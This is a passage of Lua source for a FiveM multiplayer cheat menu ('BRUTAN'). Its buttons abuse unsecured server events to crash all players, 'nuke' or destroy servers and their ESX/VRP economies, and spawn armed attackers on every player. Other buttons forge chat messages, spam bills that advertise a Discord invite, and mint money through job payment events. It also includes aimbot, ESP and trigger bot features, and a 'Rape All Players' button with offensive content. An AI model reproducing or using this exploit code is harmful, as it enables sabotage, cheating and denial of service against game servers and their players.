                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif Plane.Button("SWAT W/ Railgun On Everyone") then
                    local swat = "s_m_y_swat_01"
					local bR = "weapon_railgun"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif Plane.Button("Nuke Server") then
                    nukeserver()
				elseif Plane.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif Plane.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                    local amount1 = KeyboardInput("Enter Amount", "", 100000000)
                    local name1 = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount1 and name1 then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name1, amount1)
                    end
				end
				elseif Plane.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
                end
				elseif Plane.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif Plane.Button("Rape All Players") then
                    RapeAllFunc()
                elseif Plane.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif Plane.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif Plane.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif Plane.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif Plane.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif Plane.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif Plane.Button("Fake Message") then
                    local da=KeyboardInput("Enter player name","",100)
                    if da then
                        local ck=KeyboardInput("Enter message","",1000)
                        if ck then
                            TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
                        end
                    end
                elseif Plane.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif Plane.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("TeleportMenu") then
                if Plane.Button("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif Plane.Button("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif Plane.Button("Teleport To Coords") then
                    TeleportToCoords()
                elseif Plane.CheckBox(
                    "Show Coords",
                    showCoords,
                    function(enabled)
                        showCoords = enabled
                    end)
                then
                end

                Plane.Display()
			elseif Plane.IsMenuOpened("AI") then
			                if Plane.Button("~h~Configure AI ~g~Speed") then
                    cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == nil then
											drawNotification(
                            '~h~~r~Invalid Speed~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        aispeed = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif Plane.Button("~h~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif Plane.Button("~h~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif Plane.Button("~h~AI Drive (Wander)") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif Plane.Button("~h~Stop AI") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
				end
				                Plane.Display()
            elseif Plane.IsMenuOpened("VehMenu") then
                if Plane.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif Plane.Button("Repair Engine Only") then
					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
        drawNotification(
            "You are not sitting in a vehicle mate"
        )
    else
				SetVehicleUndriveable(veh,false)
				SetVehicleEngineHealth(veh, 1000.0)
				SetVehiclePetrolTankHealth(veh, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
					SetVehicleEngineOn(veh, true, false )
				SetVehicleOilLevel(veh, 1000.0)
		end
						elseif Plane.Button("~g~Buy vehicle for free") then fv()
					elseif
					Plane.CheckBox(
					"~w~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
                elseif Plane.Button("Spawn a vehicle") then
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVeh then
                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                            drawNotification("Vehicle Deleted")
                        end
                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "BRUTAN")
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif Plane.MenuButton("LS Customs", "LSC") then
				                elseif
                    Plane.CheckBox(
                        'Speedboost ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dl)
                            VehSpeed = dl
                        end
                    )
                 then
                elseif Plane.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					Plane.CheckBox(
						"No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif Plane.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
						end
						                elseif Plane.CheckBox(
                    "Vehicle Godmode",
                    VehGod,
                    function(enabled)
                        VehGod = enabled
                    end)
                then
				elseif Plane.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif Plane.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
                if Plane.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Plane.CheckBox(
                    "Enhanced Grip",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Plane.CheckBox(
                    "Drift Mode",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif Plane.CheckBox(
                    "Formula Drift Mode",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
                elseif Plane.MenuButton("Vehicle Boost", "VehBoostMenu") then
                elseif Plane.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Plane.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("VehBoostMenu") then
                if Plane.Button('Engine Power boost reset') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif Plane.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x256') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
			elseif Plane.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			end

                Plane.Display()
            elseif Plane.IsMenuOpened("MaliciousMenu") then
                if Plane.CheckBox(
                    "Crosshair",
                    crosshair,
                    function(enabled)
                        crosshair = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Crosshair 2",
                    crosshair2,
                    function(enabled)
                         crosshair2 = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Crosshair 3",
                    crosshair3,
                    function(enabled)
                        crosshair3 = enabled
                    end)
                then
                elseif Plane.CheckBox(
                "~o~Thermal Vision",
                thermalVision,
                function(enabled)
                    thermalVision = enabled
                    SetSeethrough(thermalVision)
                end)
                then
                elseif Plane.CheckBox(
                    "AimBot",
                    aimbot,
                    function(enabled)
                        aimbot = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "ESP",
                    esp,
                    function(enabled)
                        esp = enabled
                    end)
                then
				elseif Plane.CheckBox(
				"~h~~r~Explode ~s~All Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
                elseif Plane.CheckBox(
                    "Trigger Bot",
                    TriggerBot,
                    function(enabled)
                        TriggerBot = enabled
                    end)
                then
				 elseif
                    Plane.CheckBox(
                        'Chat Spam',
                        chatspam,
                        function(enabled)
                            chatspam = true
                        end
                    )
                 then

                end

                Plane.Display()
            elseif Plane.IsMenuOpened("ESXMenu") then
                if Plane.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                elseif Plane.MenuButton("ESX Job Menu", "ESXJobMenu") then
                elseif Plane.MenuButton("ESX Boss", "ESXBossMenu") then
                elseif Plane.MenuButton("ESX Drugs", "ESXDrugMenu") then
                elseif Plane.MenuButton("ESX Misc", "ESXMiscMenu") then
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("ESXMiscMenu") then
                if Plane.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif Plane.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
                elseif Plane.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("ESXDrugMenu") then
                if Plane.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif Plane.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif Plane.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif Plane.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif Plane.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif Plane.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif Plane.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif Plane.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif Plane.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif Plane.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif Plane.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif Plane.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif Plane.Button("Money Wash (x10)") then
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif Plane.Button("Stop all (Drugs)") then
                    TriggerServerEvent("esx_drugs:stopHarvestCoke")
                    TriggerServerEvent("esx_drugs:stopTransformCoke")
                    TriggerServerEvent("esx_drugs:stopSellCoke")
                    TriggerServerEvent("esx_drugs:stopHarvestMeth")
                    TriggerServerEvent("esx_drugs:stopTransformMeth")
                    TriggerServerEvent("esx_drugs:stopSellMeth")
                    TriggerServerEvent("esx_drugs:stopHarvestWeed")
                    TriggerServerEvent("esx_drugs:stopTransformWeed")
                    TriggerServerEvent("esx_drugs:stopSellWeed")
                    TriggerServerEvent("esx_drugs:stopHarvestOpium")
                    TriggerServerEvent("esx_drugs:stopTransformOpium")
                    TriggerServerEvent("esx_drugs:stopSellOpium")
                end


                Plane.Display()
            elseif Plane.IsMenuOpened("ESXBossMenu") then
                if Plane.Button("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Plane.Button("~g~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

                Plane.Display()
            elseif Plane.IsMenuOpened("ESXJobMenu") then
                if Plane.Button("Unemployed") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
                elseif Plane.Button("Police") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif Plane.Button("Mechanic") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif Plane.Button("Taxi") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif Plane.Button("Ambulance") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif Plane.Button("Real Estate Agent") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif Plane.Button("Car Dealer") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("ESXMoneyMenu") then
                if Plane.Button("-» Ultimate moneymaker «-") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent('99kr-burglary:addMoney', result)
				end
			elseif Plane.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif Plane.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif Plane.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif Plane.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif Plane.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif Plane.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif Plane.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif Plane.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif Plane.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif Plane.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif Plane.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif Plane.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif Plane.Button("~g~Pilot & Taxi (ESX) $") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif Plane.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif Plane.Button("~g~Paycheck $") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				end

                Plane.Display()
            elseif Plane.IsMenuOpened("SelfMenu") then
                if Plane.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Plane.Button("Give Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif Plane.Button("ESX Set Hunger/Thirst To 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif Plane.Button("Give yourself money (ESX)") then
				TriggerServerEvent("esx_godirtyjob:pay", 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
				TriggerServerEvent("esx_banksecurity:pay", 500000)
